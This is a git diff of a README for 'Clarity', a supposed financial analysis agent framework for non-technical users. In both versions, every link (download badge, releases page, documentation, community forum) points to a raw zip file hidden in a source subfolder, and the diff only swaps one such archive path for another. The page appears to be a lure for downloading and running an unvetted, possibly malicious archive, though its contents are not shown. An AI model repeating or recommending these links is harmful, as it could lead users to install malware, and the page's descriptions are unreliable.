@@ -1,7 +1,7 @@
 # 💼 Clarity - Streamline Your Financial Analysis
 
 ## 📥 Download Clarity
-[![Download Clarity](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip%https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip)](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip)
+[![Download Clarity](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip%https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip)](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Clarity! This guide will help you download and run Clarity, our financial analysis agent framework. No technical skills are required. Follow these simple steps.
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 - **User-Friendly Interface:** Navigate through various features with ease.
 
 ## 📋 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip).
+1. Visit the [Releases page](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip).
 2. Choose the version you want to download.
 3. Click on the appropriate file for your operating system (e.g., Windows, macOS, or Linux).
 4. The download will begin. Once complete, locate the file in your downloads folder.
@@ -58,11 +58,11 @@ If you encounter any issues or have questions, help is available:
 - Join our community forum to connect with other users.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip)
-- [Community Forum](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip)
+- [Documentation](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip)
+- [Community Forum](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip)
 
 ## 💡 Tips
-- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip).
+- Regularly check for updates on the [Releases page](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip).
 - Utilize the logs feature to enhance your workflow.
 - Experiment with different sub-agents to find what works best for you.
 
@@ -72,4 +72,4 @@ We plan to add new features and improve existing ones. Future updates may includ
 - More sub-agents tailored for specific financial tasks.
 - Integration with popular financial tools.
 
-Enjoy using Clarity to make your financial analysis efficient and effective! Remember to check our [Releases page](https://raw.githubusercontent.com/mdsiyam69/Clarity/main/.claude/skills/fundamentals-analyst/Software_v3.0.zip) for the latest updates and versions.
+Enjoy using Clarity to make your financial analysis efficient and effective! Remember to check our [Releases page](https://github.com/mdsiyam69/Clarity/raw/refs/heads/main/clarity/core/tools/data_provider/Software_2.6-beta.4.zip) for the latest updates and versions.
